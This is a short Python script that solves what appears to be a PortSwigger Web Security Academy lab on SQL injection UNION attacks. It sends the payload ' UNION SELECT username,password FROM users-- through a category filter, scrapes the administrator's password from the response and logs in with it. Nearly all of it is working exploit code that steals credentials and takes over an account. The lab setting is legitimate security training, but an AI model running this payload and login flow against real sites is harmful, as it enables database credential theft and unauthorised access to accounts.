# Retrieving data from other database tables
# Union 3 - Using an SQL injection UNION attack to retrieve interesting data

import requests
from bs4 import BeautifulSoup

url_sqli = "https://ac991f141f441f15801d9455002900b2.web-security-academy.net/filter?category=Pets' UNION SELECT username,password FROM users--"
url_login = "https://ac991f141f441f15801d9455002900b2.web-security-academy.net/login"

s = requests.Session()

def get_password():
    # grab csrf token for login
    r_login = s.get(url_login)
    soup1 = BeautifulSoup(r_login.text, 'html.parser')
    csrftoken = soup1.find('input', attrs = {"name":"csrf"})['value']
    # grab admin creds
    r_pw = s.get(url_sqli)
    soup2 = BeautifulSoup(r_pw.text, 'html.parser')
    admin_password = soup2.find(text='administrator').findNext('td').text
    # for x in soup2.find_all("tr"):
    #     print(x)
    #     th = x.find("th").contents
    #     td = x.find("td").contents
    #     # print(th, td)         #print all usernames and passwords from the table
    #     if 'administrator' in th or 'admin' in th:
    #         admin_username = str(th[0]) 
    #         admin_password = str(td[0])
    #     else:
    #         print("Admin user not found")
    #         exit()
    return { 'csrf' : csrftoken, 'username' : 'administrator', 'password' : admin_password }

try:
    payload = get_password()    
    print(f"Looging in with: {payload}")
    r_solve = s.post(url_login, payload)
    if "Congratulations, you solved the lab!" in r_solve.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print(e)